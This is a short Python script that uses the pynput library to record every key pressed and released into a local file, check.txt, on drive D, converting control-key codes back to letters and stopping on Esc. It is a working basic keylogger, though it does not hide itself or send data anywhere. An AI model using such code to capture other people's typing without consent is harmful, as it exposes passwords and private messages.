from pynput import keyboard
import os
os.chdir('D:\\')

ls = ['\\x01', '\\x02', '\\x03', '\\x04', '\\x05', '\\x06', '\\x07', '\\x08', 
		'\\t', '\\n', '\\x0b', '\\x0c', '\\r', '\\x0e', '\\x0f', '\\x10', '\\x11', 
		'\\x12', '\\x13', '\\x14', '\\x15', '\\x16', '\\x17', '\\x18', '\\x19', '\\x1a']

def press(key):
	string = str(key)
	file = open('check.txt', 'a')
	if string[1:len(string)-1] in ls:
		temp = ls.index(string[1:len(string)-1])
		temp += 97
		text = '\''+chr(temp)+'\' pressed\n'
	else:
		text = string+' pressed\n'
	file.write(text)
	file.close()

	
def release(key):
	string = str(key)
	if string == 'Key.backspace' or string == 'Key.space':
		return
	file = open('check.txt', 'a')
	if key == keyboard.Key.esc:
		exit()
	if len(string) > 7:
		text = string+' released\n'
		file.write(text)
	file.close()
	

with keyboard.Listener(on_press = press, on_release = release) as listener:
	listener.join()
